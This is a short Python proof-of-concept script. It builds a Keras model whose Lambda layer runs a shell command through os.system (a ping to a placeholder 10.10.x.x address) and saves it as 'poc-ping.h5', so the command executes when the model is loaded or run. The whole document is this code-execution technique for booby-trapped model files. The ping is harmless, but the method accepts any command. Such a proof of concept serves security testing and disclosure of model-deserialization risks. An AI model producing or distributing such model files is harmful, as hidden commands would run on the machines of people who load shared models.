import tensorflow as tf
from tensorflow import keras
from tensorflow.keras import layers

def payload(x):
    import os
    os.system("ping -c 3 10.10.x.x")
    return x

model = keras.Sequential([
    layers.Input(shape=(1,)),
    layers.Lambda(payload)
])

model.save("poc-ping.h5")
